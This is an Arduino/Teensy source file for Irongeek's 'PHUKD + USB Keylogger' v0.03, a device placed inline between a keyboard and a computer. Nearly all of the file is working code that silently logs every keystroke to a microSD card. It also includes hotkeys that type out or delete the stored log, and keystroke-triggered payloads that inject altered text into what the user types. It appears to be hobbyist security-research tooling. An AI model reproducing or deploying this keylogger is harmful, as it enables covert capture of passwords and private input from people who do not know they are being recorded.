/* 
 Irongeek's PHUKD + USB Keylogger
 version 0.03
 
 Not only can you log keys, you can change payloads based on them.
 This code is experimental, expect bugs and please send me fixes.
 
 It has four keystroke based payloads:
 1. Ctrl+Alt+L types out the keylog
 2. Ctrl+Alt+Y shows the last few keys, for debugging things like payload 3
 3. Typing "Adrian" in UPPER or lower case makes for a nice addition
 4. Ctrl+Alt+D clear keylog
 5. F12 enables LOL speak.
 
 It also logs to the microSD card.
 Hey, it's experimental, expect bugs and please send me fixes.
 Sections of the code have been based on others' projects, I try to credit and link to them. Hope I did not miss anyone.
 
 To learn more about Teensyduino see:
 http://www.pjrc.com/teensy/teensyduino.html
 Look in arduino-xxxx\hardware\teensy\cores\tensy_hid\usb_api.h for key definitions
 Edit arduino-xxxx\hardware\teensy\cores\tensy_hid\usb_private.h to change USB Vendor and Product ID
 
 Change log:
 
 0.00: Released to public
 
 0.01: 
 
 * Holding mod keys did not always work for multi select. Got it working by taking out the key replay code,
 and made held keys function better in the process. Also, it made the code simpler to read as I got rid 
 of a bunch of unneeded cruft code. :) 
 * Nulls were getting into the logs, so I made an unhandled keycode exception.
 *Changed log brackets from <> to [].
 
 0.02:
 * Fixed bug in logging unknown keys. 
 * Added logging for keys [KEY_TAB] and [KEY_NON_US_NUM]. 
 * Ctrl+Alt+S toggles the typing of raw bytes as they come in the serial connection.
 * Converted ints to bytes in many places. I think their was a type casting problem causing weird issues.
 * Fixed a buffer overflow issue caused by IncomingHIDReportIndex going over 18.
 * Many other tiny changes.
 
 0.03:
 * Made sure it worked with Arduino 1.0.
 * Switched to using the SD library that comes with Teensyduino (from the comments, it looks like 
 it's a wrapper by SparkFun Electronics around William Greiman's work).
 * Changed the variables "file" to "logfile" and "filename" to "logfilename" to be less ambiguous.
 
 */

#include <phukdlib.h>
#include <SD.h>
const byte chipSelect = 0; //This is for the SD library on the Teensy
File logfile;
char logfilename[] = "USBKLOG.TXT";
byte ledPin =  11;    // LED connected to digital pin 11
HardwareSerial Uart = HardwareSerial();
byte IncomingHIDReportIndex = 0;
byte modkeys = 0;
byte keycode1 = 0;
byte keycode2 = 0;
byte keycode3 = 0;
byte keycode4 = 0;
byte keycode5 = 0;
byte keycode6 = 0;
byte incomingByte;
byte keyarr[19];

String lasttenletters="ABCDEFGHIJ";//I just filled it with these letter to help me debug

// The setup() method runs once, when the sketch starts
void setup()   {  
  delay(1000); //Avoid seeing banner  
  Uart.begin(58000);
  keyarr[17]=0;
  keyarr[18]=0;
  pinMode(10, OUTPUT); //Apparently, this is needed by the SD card library.
  if (!SD.begin(chipSelect)) digitalWrite(ledPin, HIGH); //Turn on LED if there is an error
}

// the loop() method runs over and over again,
// as long as the Arduino has power

void loop()                     
{
  char tempchar;
  static boolean loltoggle = false;
  static boolean typerawserialtoggle = false;

  if (Uart.available()) {      
    incomingByte = Uart.read();
    keyarr[IncomingHIDReportIndex]=incomingByte;
    if (IncomingHIDReportIndex == 17) {
      keyarr[18]=1;
    }//Not Sent flag
    delayMicroseconds(250); //Without delay, stuff don't work. Not sure why.
    if (IncomingHIDReportIndex < 18 ) IncomingHIDReportIndex++;
    if (typerawserialtoggle) Keyboard.print(char(incomingByte));//PrintkeyarrSimp(); //use for debugging
  } 
  else {
    if (keyarr[18]){
      //BEGINNING of section that sends and logs what was typed
      SendHIDToKeyboard(keyarr);
      LogThisKey(keyarr);
      keyarr[18]=0; //Not Sent flag
      IncomingHIDReportIndex=0;
      //ENDING of section that sends and logs what was typed    

      //Ok, the rest of this is to change the programmable HID payloads
      modkeys=(TakeANibble(keyarr[0])|TakeANibble(keyarr[1]));      
      keycode1=TwoByteHexToKeyCode(keyarr[4],keyarr[5]);  
      keycode2=TwoByteHexToKeyCode(keyarr[6],keyarr[7]);  
      keycode3=TwoByteHexToKeyCode(keyarr[8],keyarr[9]);  
      keycode4=TwoByteHexToKeyCode(keyarr[10],keyarr[11]);  
      keycode5=TwoByteHexToKeyCode(keyarr[12],keyarr[13]);  
      keycode6=TwoByteHexToKeyCode(keyarr[14],keyarr[15]);  

      //Check for Ctrl+Alt+L (types out the keylog)
      if (modkeys==(MODIFIERKEY_CTRL | MODIFIERKEY_ALT) && keycode1==KEY_L){
        //CommandAtRunBarMSWIN("notepad.exe");  
        //delay(2000);        
        Keyboard.println("\r\nYOUR KEYLOG:");
        TypeOutLogFile(logfilename); //Let's show the log. You could also pull out the microSD and just read it.
      }

      //Check for Ctrl+Alt+D (clear keylog)
      if (modkeys==(MODIFIERKEY_CTRL | MODIFIERKEY_ALT) &&  keycode1==KEY_D){
        Keyboard.println("\r\nDELETING KEYLOG...");
        DeleteLogFile(logfilename); 
      }

      //Check for Ctrl+Alt+Y (shows the last few keys, for debugging)
      if (modkeys==(MODIFIERKEY_CTRL | MODIFIERKEY_ALT) && keycode1==KEY_Y){
        Keyboard.println(lasttenletters);
      }

      //Check for Ctrl+Alt+S (Type raw serial)
      if (modkeys==(MODIFIERKEY_CTRL | MODIFIERKEY_ALT) && keycode1==KEY_S){
        typerawserialtoggle = !typerawserialtoggle;
        if (typerawserialtoggle){
          Keyboard.println("\r\nType Raw Serial ON");
        } 
        else {
          Keyboard.println("\r\nType Raw Serial OFF");
        }
      }    

      //BEGINNING of the part that buffers the last few characters so we can base payloads on keystrokes
      tempchar=HIDtoASCII(keycode1,modkeys);
      if (tempchar){  //This shoould only run if a real char is returned in the line above.
        for(byte j=0; j<9; j++){
          lasttenletters[j]=lasttenletters[j+1];
        }
        lasttenletters[9] = tempchar;
      }
      //ENDING of the part that buffers the last few characters so we can base payloads on keystrokes

      //Check to see if they typed my name, make the appropriate change
      if (lasttenletters.toLowerCase().endsWith("adrian")) {
        Keyboard.print(" is awesome!");
        lasttenletters[9]='*'; //Just change the last character to stop if from triggering again
      }
      //Done checking

      //Check for F12 (enable leet)
      if (keycode1==KEY_F12){
        loltoggle = !loltoggle;
        if (loltoggle){
          Keyboard.println("\r\nU can haz L0Lz!");
        } 
        else {
          Keyboard.println("\r\nLOL mode disabled.");
        }
      }
      //Check if 1337 mode is on, do replacments if so
      if (loltoggle) LoLIt();      
      //Done checking
    }
  }  
}

byte TwoByteHexToKeyCode(byte hB, byte lB){
  byte hBi;
  byte lBi;
  hBi=TakeANibble(hB)*16;
  lBi=TakeANibble(lB);
  return hBi + lBi ;
}

byte TakeANibble(byte aB){
  byte aBi;
  if (aB > 47 && aB<58 ){
    aBi=aB-48;
  }
  if (aB > 64 && aB<71 ){
    aBi=aB-55;
  }
  return aBi;
}

/*
Next two Functions below are just to get the code out of main/loop and make code more readable. 
 */
void SendHIDToKeyboard(byte *HIDArr)
{
  int lmodkeys,lkeycode1,lkeycode2,lkeycode3,lkeycode4,lkeycode5,lkeycode6;
  lmodkeys=(TakeANibble(HIDArr[0])|TakeANibble(HIDArr[1]));       
  lkeycode1=TwoByteHexToKeyCode(HIDArr[4],HIDArr[5]);  
  lkeycode2=TwoByteHexToKeyCode(HIDArr[6],HIDArr[7]);  
  lkeycode3=TwoByteHexToKeyCode(HIDArr[8],HIDArr[9]);  
  lkeycode4=TwoByteHexToKeyCode(HIDArr[10],HIDArr[11]);  
  lkeycode5=TwoByteHexToKeyCode(HIDArr[12],HIDArr[13]);  
  lkeycode6=TwoByteHexToKeyCode(HIDArr[14],HIDArr[15]); 
  Keyboard.set_modifier(lmodkeys);
  Keyboard.set_key1(lkeycode1);
  Keyboard.set_key2(lkeycode2);
  Keyboard.set_key3(lkeycode3);
  Keyboard.set_key4(lkeycode4);
  Keyboard.set_key5(lkeycode5);
  Keyboard.set_key6(lkeycode6);
  Keyboard.send_now();
}

/* HID to ASCII code converter largely based on:
 http://www.circuitsathome.com/mcu/how-to-drive-usb-keyboard-from-arduino
 I had to change some vars to make it work without his library
 */
byte HIDtoASCII( byte HIDbyte, byte mod )
{
  /* upper row of the keyboard, numbers and special symbols */
  if( HIDbyte >= 0x1e && HIDbyte <= 0x27 ) {
    if(mod & MODIFIERKEY_SHIFT || IsNumbOn()) {    //shift key pressed
      switch( HIDbyte ) {
      case KEY_1:  
        return( '!' ); //!
      case KEY_2:    
        return( '@' ); //@
      case KEY_3: 
        return( '#' ); //#
      case KEY_4: 
        return( '$' ); //$
      case KEY_5: 
        return( '%' ); //%
      case KEY_6: 
        return( '^' ); //^
      case KEY_7: 
        return( '&' ); //&
      case KEY_8: 
        return( '*' ); //*
      case KEY_9: 
        return( '(' ); //(
      case KEY_0: 
        return( ')' ); //)
      }//switch( HIDbyte...
    }
    else {                  //numbers
      if( HIDbyte == 0x27 ) {  //zero
        return( 0x30 );
      }
      else {
        return( HIDbyte + 0x13 );
      }
    }//numbers
  }//if( HIDbyte >= 0x1e && HIDbyte <= 0x27
  /**/
  /* number pad. Arrows are not supported */
  if(( HIDbyte >= 0x59 && HIDbyte <= 0x61 ) && ( IsNumbOn()  == true )) {  // numbers 1-9
    return( HIDbyte - 0x28 );
  }
  if(( HIDbyte == 0x62 ) && ( IsNumbOn() == true )) {                      //zero
    return( 0x30 );
  }
  /* Letters a-z */
  if( HIDbyte >= 0x04 && HIDbyte <= 0x1d ) {
    if((( IsCapsOn() == true ) && ( mod & MODIFIERKEY_SHIFT ) == 0 ) || (( IsCapsOn() == false ) && ( mod & MODIFIERKEY_SHIFT ))) {  //upper case
      return( HIDbyte + 0x3d );
    }
    else {  //lower case
      return( HIDbyte + 0x5d );
    }
  }//if( HIDbyte >= 0x04 && HIDbyte <= 0x1d...
  /* Other special symbols */
  if( HIDbyte >= 0x2c && HIDbyte <= 0x38 ) {
    switch( HIDbyte ) {
    case KEY_SPACE: 
      return( 0x20 );
    case KEY_MINUS:
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x2d );
      }
      else {
        return( 0x5f );
      }
    case KEY_EQUAL:
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x3d );
      }
      else {
        return( 0x2b );
      }
    case KEY_LEFT_BRACE :
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x5b );
      }
      else {
        return( 0x7b );
      }
    case KEY_RIGHT_BRACE:
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x5d );
      }
      else {
        return( 0x7d );
      }
    case KEY_BACKSLASH:
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x5c );
      }
      else {
        return( 0x7c );
      }
    case KEY_SEMICOLON:
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x3b );
      }
      else {
        return( 0x3a );
      }
    case KEY_QUOTE:
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x27 );
      }
      else {
        return( 0x22 );
      }
    case KEY_TILDE:
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x60 );
      }
      else {
        return( 0x7e );
      }
    case KEY_COMMA:
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x2c );
      }
      else {
        return( 0x3c );
      }
    case KEY_PERIOD:
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x2e );
      }
      else {
        return( 0x3e );
      }
    case KEY_SLASH:
      if(( mod & MODIFIERKEY_SHIFT ) == false ) {
        return( 0x2f );
      }
      else {
        return( 0x3f );
      }
    default:
      break;
    }//switch( HIDbyte..
  }//if( HIDbye >= 0x2d && HIDbyte <= 0x38..
  return( 0 );
}

void LogThisKey(byte *HIDArr)
{
  int lmodkeys,lkeycode1,lkeycode2,lkeycode3,lkeycode4,lkeycode5,lkeycode6;
  char tempHIDtoASCII = 0;
  lmodkeys=(TakeANibble(HIDArr[0])|TakeANibble(HIDArr[1]));      
  lkeycode1=TwoByteHexToKeyCode(HIDArr[4],HIDArr[5]);  
  lkeycode2=TwoByteHexToKeyCode(HIDArr[6],HIDArr[7]);  
  lkeycode3=TwoByteHexToKeyCode(HIDArr[8],HIDArr[9]);  
  lkeycode4=TwoByteHexToKeyCode(HIDArr[10],HIDArr[11]);  
  lkeycode5=TwoByteHexToKeyCode(HIDArr[12],HIDArr[13]);  
  lkeycode6=TwoByteHexToKeyCode(HIDArr[14],HIDArr[15]);
  if(lmodkeys || lkeycode1){//Don't send if it's a 0
    logfile=SD.open(logfilename, FILE_WRITE);  
    if (!logfile) digitalWrite(ledPin, HIGH);
    if (lmodkeys && lkeycode1){ //only log mod keys if a normal key is also pressed
      if (lmodkeys & 1) logfile.print("[CRTL]");
      if (lmodkeys & 2) logfile.print("[SHIFT]"); //Getting rid of shifts may make the log easier to read
      if (lmodkeys & 4) logfile.print("[ALT]");
      if (lmodkeys & 8) logfile.print("[WINKEY]");
    } 
    //Notice I'm just logging the first key
    switch (lkeycode1){
    case 0:
      //Do nada
      break;
    case 40: 
      logfile.println("[KEY_ENTER]");
      break;
    case 41: 
      logfile.println("[KEY_ESC]");
      break;
    case 42: 
      logfile.println("[KEY_BACKSPACE]");
    case 43: 
      logfile.print("[KEY_TAB]");
      break;
    case 50: 
      logfile.println("[KEY_NON_US_NUM]");
      break;
    case 57: 
      logfile.println("[KEY_CAPS_LOCK]");
      break;
    case 58: 
      logfile.println("[KEY_F1]");
      break;
    case 59: 
      logfile.println("[KEY_F2]");
      break;
    case 60: 
      logfile.println("[KEY_F3]");
      break;
    case 61: 
      logfile.println("[KEY_F4]");
      break;
    case 62: 
      logfile.println("[KEY_F5]");
      break;       
    case 63: 
      logfile.println("[KEY_F6]");
      break;    
    case 64: 
      logfile.println("[KEY_F7]");
      break;    
    case 65: 
      logfile.println("[KEY_F8]");
      break;    
    case 66: 
      logfile.println("[KEY_F9]");
      break;    
    case 67: 
      logfile.println("[KEY_F10]");
      break;    
    case 68: 
      logfile.println("[KEY_F11]");
      break;    
    case 69: 
      logfile.println("[KEY_F12]");
      break;           
    case 70: 
      logfile.println("[KEY_PRINTSCREEN]");
      break;   
    case 71: 
      logfile.println("[KEY_SCROLL_LOCK]");
      break;
    case 72: 
      logfile.println("[KEY_PAUSE]");
      break;
    case 73: 
      logfile.println("[KEY_INSERT]");
      break;
    case 74: 
      logfile.println("[KEY_HOME]");
      break;
    case 75: 
      logfile.println("[KEY_PAGE_UP]");
      break;
    case 76: 
      logfile.println("[KEY_DELETE]");
      break;
    case 77: 
      logfile.println("[KEY_END]");
      break;
    case 78: 
      logfile.println("[KEY_PAGE_DOWN]");
      break;
    case 79: 
      logfile.println("[KEY_RIGHT]");
      break;
    case 80: 
      logfile.println("[KEY_LEFT]");
      break;       
    case 81: 
      logfile.println("[KEY_DOWN]");
      break;
    case 82: 
      logfile.println("[KEY_UP]");
      break;
    case 83: 
      logfile.println("[KEY_NUM_LOCK]");
      break;
    case 84: 
      logfile.print("[KEYPAD_SLASH]");
      break;
    case 85: 
      logfile.print("[KEYPAD_ASTERIX]");
      break;
    case 86: 
      logfile.print("[KEYPAD_MINUS]");
      break;
    case 87: 
      logfile.print("[KEYPAD_PLUS]");
      break;
    case 88: 
      logfile.println("[KEYPAD_ENTER]");
      break;
    case 89: 
      logfile.print("[KEYPAD_1]");
      break;
    case 90: 
      logfile.print("[KEYPAD_2]");
      break;    
    case 91: 
      logfile.print("[KEYPAD_3]");
      break;  
    case 92: 
      logfile.print("[KEYPAD_4]");
      break;  
    case 93: 
      logfile.print("[KEYPAD_5]");
      break;  
    case 94: 
      logfile.print("[KEYPAD_6]");
      break;  
    case 95: 
      logfile.print("[KEYPAD_7]");
      break;  
    case 96: 
      logfile.print("[KEYPAD_8]");
      break;  
    case 97: 
      logfile.print("[KEYPAD_9]");
      break;  
    case 98: 
      logfile.print("[KEYPAD_0]");
      break;  
    case 99: 
      logfile.println("[KEYPAD_PERIOD]");
      break;  
    default:   //The code below should cover all the other cases
      tempHIDtoASCII =HIDtoASCII(lkeycode1,lmodkeys);
      if (tempHIDtoASCII) {
        logfile.print(tempHIDtoASCII);
      } 
      else {
        logfile.print("\r\n[UNKNOWN KEY CODE ");
        logfile.print(lkeycode1);
        logfile.print(" MODKEYS ");
        logfile.print(lmodkeys);
        logfile.println("]");
      }
    } 
    logfile.close();
  }
}

void TypeOutLogFile(char *SomeFile){
  logfile=SD.open(SomeFile);
  while (logfile.available()) Keyboard.print((char)logfile.read());
  logfile.close();
  Keyboard.println("\r\nEND OF LOG");
}

void DeleteLogFile(char *SomeFile){
  SD.remove(SomeFile); //No reset needed here it seems.
}

//Function below just used for debugging
void Printkeyarr(){
  for (byte j=0; j<=18; j++){
    Keyboard.print("j:");
    Keyboard.print(j);
    Keyboard.print(":");
    Keyboard.println(char(keyarr[j]));
  } 
}

//Function below just used for debugging
void PrintkeyarrSimp(){
  for (byte j=0; j<=18; j++){
    Keyboard.print(char(keyarr[j]));    
  } 
  Keyboard.println();
}

void LoLIt(){
  if (lasttenletters.toLowerCase().endsWith("you ")) {
    PressAndRelease(KEY_BACKSPACE, 4);
    Keyboard.print("U ");
    lasttenletters[8]='*'; //Just change the last character to stop if from triggering again
    lasttenletters[9]=' '; //Put space back on the ring so the next one can trigger 
  }
  if (lasttenletters.toLowerCase().endsWith("why ")) {
    PressAndRelease(KEY_BACKSPACE, 4);
    Keyboard.print("Y ");
    lasttenletters[8]='*'; //Just change the last character to stop if from triggering again
    lasttenletters[9]=' '; //Put space back on the ring so the next one can trigger 
  }
  if (lasttenletters.toLowerCase().endsWith(" have ")) {
    PressAndRelease(KEY_BACKSPACE, 3);
    Keyboard.print("z ");
    lasttenletters[8]='*'; //Just change the last character to stop if from triggering again
    lasttenletters[9]=' '; //Put space back on the ring so the next one can trigger 
  }
  if (lasttenletters.toLowerCase().endsWith(" has ")) {
    PressAndRelease(KEY_BACKSPACE, 2);
    Keyboard.print("z ");
    lasttenletters[8]='*'; //Just change the last character to stop if from triggering again
    lasttenletters[9]=' '; //Put space back on the ring so the next one can trigger 
  }
  if (lasttenletters.toLowerCase().endsWith(" long ")) {
    PressAndRelease(KEY_BACKSPACE, 3);
    Keyboard.print("ooooooooooooooooooooooooooooong ");
    lasttenletters[8]='*'; //Just change the last character to stop if from triggering again
    lasttenletters[9]=' '; //Put space back on the ring so the next one can trigger 
  }
  if (lasttenletters.toLowerCase().endsWith(" I'm ")) {
    PressAndRelease(KEY_BACKSPACE, 3);
    Keyboard.print("z ");
    lasttenletters[8]='*'; //Just change the last character to stop if from triggering again
    lasttenletters[9]=' '; //Put space back on the ring so the next one can trigger 
  }
  if (lasttenletters.toLowerCase().endsWith(" i am ")) {
    PressAndRelease(KEY_BACKSPACE, 4);
    Keyboard.print("z ");
    lasttenletters[8]='*'; //Just change the last character to stop if from triggering again
    lasttenletters[9]=' '; //Put space back on the ring so the next one can trigger 
  }
  if (lasttenletters.toLowerCase().endsWith(" cheese")) {
    PressAndRelease(KEY_BACKSPACE, 2);
    Keyboard.print("z");
    lasttenletters[8]='*'; //Just change the last character to stop if from triggering again
    lasttenletters[9]=' '; //Put space back on the ring so the next one can trigger 
  }
  if (lasttenletters.toLowerCase().endsWith(" the ")) {
    PressAndRelease(KEY_BACKSPACE, 3);
    Keyboard.print("eh ");
    lasttenletters[8]='*'; //Just change the last character to stop if from triggering again
    lasttenletters[9]=' '; //Put space back on the ring so the next one can trigger 
  }
  if (lasttenletters.toLowerCase().endsWith(" don't ")) {
    PressAndRelease(KEY_BACKSPACE, 6);
    Keyboard.print("NO ");
    lasttenletters[8]='*'; //Just change the last character to stop if from triggering again
    lasttenletters[9]=' '; //Put space back on the ring so the next one can trigger 
  }
}
